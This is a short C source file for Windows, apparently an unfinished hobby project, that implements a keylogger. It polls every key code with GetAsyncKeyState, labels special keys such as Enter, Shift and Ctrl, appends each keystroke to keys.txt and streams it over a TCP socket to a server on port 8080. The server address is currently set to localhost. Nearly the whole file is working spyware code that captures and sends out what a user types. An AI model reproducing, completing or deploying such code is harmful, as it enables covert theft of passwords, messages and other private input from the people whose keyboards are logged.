#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>
#include <winuser.h>
#include <ws2tcpip.h>

// this file still needs fixing

void startLogging(struct sockaddr_in *serv_addr, int client_fd);
void startWinsock(WSADATA *wsaData);
int startSocket();
void connectToServer(struct sockaddr_in *serv_addr, int client_fd);
void sendMsg(int client_fd, const char *msg);
void closeSocket(int client_fd);

int main() {
    int valread;
    int client_fd;
    struct sockaddr_in serv_addr;
    const char *msg = "Hello from client";
    char buffer[1024] = {0};
    WSADATA wsaData;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(8080);

    startWinsock(&wsaData);
    client_fd = startSocket();

    startLogging(&serv_addr, client_fd);
    return 0;
}

void startLogging(struct sockaddr_in *serv_addr, int client_fd) {
    FILE *keysPtr;
    keysPtr = fopen("keys.txt", "w");
    keysPtr = fopen("keys.txt", "a");
    connectToServer(serv_addr, client_fd);

    // closeSocket(client_fd);
    char c;
    while (1) {
        for (c = 0; c < 255; c++) {
            short pressed = GetAsyncKeyState(c) & 0x1;
            if (pressed) {
                const char *text;

                if (c == VK_BACK) {
                    text = "[backspace]";
                    fprintf(keysPtr, "%s", text);
                    sendMsg(client_fd, text);
                } else if (c == VK_RETURN) {
                    text = "[enter]";
                    fprintf(keysPtr, "%s", text);
                    sendMsg(client_fd, text);
                } else if (c == VK_SHIFT) {
                    text = "[shift]";
                    fprintf(keysPtr, "%s", text);
                    sendMsg(client_fd, text);
                } else if (c == VK_CONTROL) {
                    text = "[ctrl]";
                    fprintf(keysPtr, "%s", text);
                    sendMsg(client_fd, text);
                } else if (c == VK_CAPITAL) {
                    text = "[caps]";
                    fprintf(keysPtr, "%s", text);
                    sendMsg(client_fd, text);
                } else if (c == VK_TAB) {
                    text = "[tab]";
                    fprintf(keysPtr, "%s", text);
                    sendMsg(client_fd, text);
                } else if (c == VK_MENU) {
                    text = "[alt]";
                    fprintf(keysPtr, "%s", text);
                    sendMsg(client_fd, text);
                } else {
                    char str[2];
                    str[0] = c;
                    str[1] = '\0';
                    text = str;
                    fprintf(keysPtr, "%s", text);
                    sendMsg(client_fd, text);
                }
            }
        }
    }
}

void startWinsock(WSADATA *wsaData) {
    if (WSAStartup(MAKEWORD(2, 2), wsaData) != 0) {
        printf("WSAStartup failed\n");
    }
}

int startSocket() {
    int client_fd;
    if ((client_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("\n Socket creation error \n");
        WSACleanup();
    }
    return client_fd;
}

void connectToServer(struct sockaddr_in *serv_addr, int client_fd) {

    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr->sin_addr) <= 0) {
        printf("\nInvalid address/ Address not supported \n");
        closesocket(client_fd);
        WSACleanup();
        exit(EXIT_FAILURE);
    }

    if (connect(client_fd, (struct sockaddr *)serv_addr, sizeof(*serv_addr)) <
        0) {
        printf("\nConnection Failed \n");
        printf("%i", client_fd);
        closesocket(client_fd);
        WSACleanup();
        exit(EXIT_FAILURE);
    }
}

void sendMsg(int client_fd, const char *msg) {
    int sent = send(client_fd, msg, strlen(msg), 0);
    printf("%s sent, status = %i \n", msg, sent);
}

void closeSocket(int client_fd) {
    closesocket(client_fd);
    WSACleanup();
}